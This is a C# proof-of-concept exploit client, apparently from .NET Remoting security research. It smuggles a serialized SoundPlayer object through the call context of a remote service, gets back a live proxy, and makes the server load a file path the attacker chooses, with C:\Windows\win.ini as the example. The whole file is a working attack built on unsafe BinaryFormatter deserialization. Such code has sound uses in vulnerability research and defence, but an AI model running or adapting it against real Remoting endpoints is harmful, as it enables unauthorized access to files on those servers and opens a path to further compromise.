using System;
using System.Runtime.Remoting.Messaging;
using System.Media;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Collections;
using System.IO;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Reflection;
using CodeWhite.Remoting.Shared;
using System.Collections.Generic;

namespace CodeWhite.Remoting.RemotingClient_MBVO
{
    internal class Program
    {
        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.Error.WriteLine($"usage: {Path.GetFileName(ASSEMBLY_LOCATION)} objUrl filePath");
                Console.Error.WriteLine();
                Console.Error.WriteLine("example:");
                Console.Error.WriteLine($@"  {Path.GetFileName(ASSEMBLY_LOCATION)} tcp://127.0.0.1:12345/DummyService C:\Windows\win.ini");
                Environment.Exit(-1);
            }

            Uri objUrl = new Uri(args[0]);
            string filePath = args[1];

            RemotingConfiguration.Configure($"{Assembly.GetExecutingAssembly().Location}.config");

            // prepare custom tcp client channel
            var properties = new Hashtable();
            var sinkProvider = new CustomClientChannelSinkProvider();
            var clientChannel = new TcpClientChannel(properties, sinkProvider);
            ChannelServices.RegisterChannel(clientChannel, false);

            // send payload object by value
            const string key = "MBRO";
            object payload = MarshalByValueObject.Create(new SoundPlayer());
            var logicalCallContextData = new Dictionary<string, object>()
            {
                { key, payload }
            };
            IMethodReturnMessage methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);

            // obtain proxy from `LogicalCallContext`
            var mbro = (MarshalByRefObject)methodReturnMessage.LogicalCallContext.GetData(key);

            // print info
            Utils.PrintInfo(mbro);

            // use remote `SoundPlayer`
            var soundPlayerProxy = (SoundPlayer)mbro;
            soundPlayerProxy.SoundLocation = filePath;
            soundPlayerProxy.Play();
        }
    }

    [Serializable]
    public class MarshalByValueObject : ISerializable
    {
        private readonly MarshalByRefObject _marshalByRefObject;

        private MarshalByValueObject(MarshalByRefObject marshalByRefObject)
        {
            if (marshalByRefObject == null)
            {
                throw new ArgumentNullException(nameof(marshalByRefObject));
            }
            Type type = marshalByRefObject.GetType();
            if (!type.IsSerializable)
            {
                throw new ArgumentException("object must be serializable");
            }
            this._marshalByRefObject = marshalByRefObject;
        }

        public static MarshalByValueObject Create(MarshalByRefObject marshalByRefObject)
        {
            return new MarshalByValueObject(marshalByRefObject);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type type = this._marshalByRefObject.GetType();
            if (typeof(ISerializable).IsAssignableFrom(type))
            {
                ((ISerializable)this._marshalByRefObject).GetObjectData(info, context);
            }
            else
            {
                MemberInfo[] members = FormatterServices.GetSerializableMembers(type, context);
                foreach (MemberInfo member in members)
                {
                    if (member.MemberType == MemberTypes.Field)
                    {
                        FieldInfo field = (FieldInfo)member;
                        info.AddValue(field.Name, field.GetValue(this._marshalByRefObject));
                    }
                }
            }
            info.SetType(this._marshalByRefObject.GetType());
        }
    }
    public class CustomClientChannelSinkProvider : IClientChannelSinkProvider
    {
        IClientChannelSinkProvider _next;
        public CustomClientChannelSinkProvider() { }

        public IClientChannelSinkProvider Next { get => _next; set => _next = value; }

        public IClientChannelSink CreateSink(IChannelSender channel, string url, object remoteChannelData)
        {
            IClientChannelSink clientChannelSink = null;
            if (this.Next != null)
            {
                clientChannelSink = this.Next.CreateSink(channel, url, remoteChannelData);
                if (clientChannelSink == null)
                {
                    return null;
                }
            }
            return new CustomBinaryClientFormatterSink(clientChannelSink);
        }
    }

    public class CustomBinaryClientFormatterSink : IClientFormatterSink
    {
        private readonly IClientChannelSink _nextSink;

        public CustomBinaryClientFormatterSink(IClientChannelSink nextSink)
        {
            this._nextSink = nextSink;
        }

        public IMessageSink NextSink => throw new NotImplementedException();

        public IClientChannelSink NextChannelSink => throw new NotImplementedException();

        public IDictionary Properties => throw new NotImplementedException();

        public IMessageCtrl AsyncProcessMessage(IMessage msg, IMessageSink replySink)
        {
            throw new NotImplementedException();
        }

        public void AsyncProcessRequest(IClientChannelSinkStack sinkStack, IMessage msg, ITransportHeaders headers, Stream stream)
        {
            throw new NotImplementedException();
        }

        public void AsyncProcessResponse(IClientResponseChannelSinkStack sinkStack, object state, ITransportHeaders headers, Stream stream)
        {
            throw new NotImplementedException();
        }

        public Stream GetRequestStream(IMessage msg, ITransportHeaders headers)
        {
            throw new NotImplementedException();
        }

        public void ProcessMessage(IMessage msg, ITransportHeaders requestHeaders, Stream requestStream, out ITransportHeaders responseHeaders, out Stream responseStream)
        {
            throw new NotImplementedException();
        }

        public IMessage SyncProcessMessage(IMessage msg)
        {
            IMethodCallMessage mcm = msg as IMethodCallMessage;
            IMessage result;
            try
            {
                ITransportHeaders requestHeaders;
                Stream requestStream;
                this.SerializeMessage(msg, out requestHeaders, out requestStream);
                ITransportHeaders transportHeaders;
                Stream stream;
                this._nextSink.ProcessMessage(msg, requestHeaders, requestStream, out transportHeaders, out stream);
                if (transportHeaders == null)
                {
                    throw new ArgumentNullException("returnHeaders");
                }
                result = this.DeserializeMessage(mcm, transportHeaders, stream);
            }
            catch (Exception e)
            {
                result = new ReturnMessage(e, mcm);
            }
            return result;
        }

        private IMessage DeserializeMessage(IMethodCallMessage mcm, ITransportHeaders transportHeaders, Stream stream)
        {
            BinaryFormatter binaryFormatter = new BinaryFormatter()
            {
                Context = new StreamingContext(StreamingContextStates.Other),
            };
            return (IMessage)binaryFormatter.Deserialize(stream);
        }

        private void SerializeMessage(IMessage msg, out ITransportHeaders headers, out Stream stream)
        {
            if (msg is IMethodCallMessage)
            {
                msg = new MethodCallMarshal((IMethodCallMessage)msg);
            }
            ITransportHeaders transportHeaders = new TransportHeaders();
            headers = transportHeaders;
            transportHeaders["Content-Type"] = "application/octet-stream";
            stream = new MemoryStream();
            BinaryFormatter binaryFormatter = new BinaryFormatter()
            {
                SurrogateSelector = (ISurrogateSelector)Activator.CreateInstance(typeof(RemotingSurrogateSelector)),
                Context = new StreamingContext(StreamingContextStates.Other),
            };
            binaryFormatter.Serialize(stream, msg);
            stream.Position = 0;
        }
    }

    [Serializable]
    public class MethodCallMarshal : IMessage, ISerializable
    {
        private readonly IMethodCallMessage _methodCall;

        public MethodCallMarshal(IMethodCallMessage methodCall)
        {
            this._methodCall = methodCall;
        }

        public IDictionary Properties => _methodCall.Properties;

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(MethodCall));
            info.AddValue("__Uri", _methodCall.Uri);
            info.AddValue("__MethodName", _methodCall.MethodName);
            info.AddValue("__MethodSignature", _methodCall.MethodBase.GetParameters().Select(p => p.ParameterType).ToArray());
            info.AddValue("__Args", _methodCall.Args);
            info.AddValue("__TypeName", _methodCall.MethodBase.DeclaringType.AssemblyQualifiedName);
            info.AddValue("__CallContext", _methodCall.LogicalCallContext);
        }
    }
}
